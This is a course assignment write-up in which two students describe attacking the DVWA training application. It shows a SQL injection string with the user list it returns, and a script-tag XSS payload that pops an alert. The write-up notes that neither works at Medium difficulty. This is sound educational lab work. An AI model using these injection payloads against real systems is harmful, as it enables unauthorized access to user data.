# CMPE 279 Assignment 3 
## Members
- Shereen Punnassery
- Mu-Te Shen

## Questions
1. We use the string `%' or '0'='0` to do the SQL injection on DVWA. This input string close the first string argument, which is supposed to be the user Id, and append an always true condition. Now the query is evaluated to True, it'll return every user in the database. The results are
```
ID: %' or '0'='0
First name: admin
Surname: admin
ID: %' or '0'='0
First name: Gordon
Surname: Brown
ID: %' or '0'='0
First name: Hack
Surname: Me
ID: %' or '0'='0
First name: Pablo
Surname: Picasso
ID: %' or '0'='0
First name: Bob
Surname: Smith
```

2. This string injection trick does not work on **Medium** difficulty since the website blocked arbitrary string input from the UI.

3. The input for this one is `Haha <script>alert("Hello World")</script>`. This works because the website does not correctly escape the input string. It takes arbitrary user input and put the result in the DOM. When the website gets updated with user input, it'll then execute the malicious Javascript we just entered, and poped up an alert of our choice. 

4. This trick doesn't work on **Medium** difficulty. Possibly because the webiste now escape the input string.  
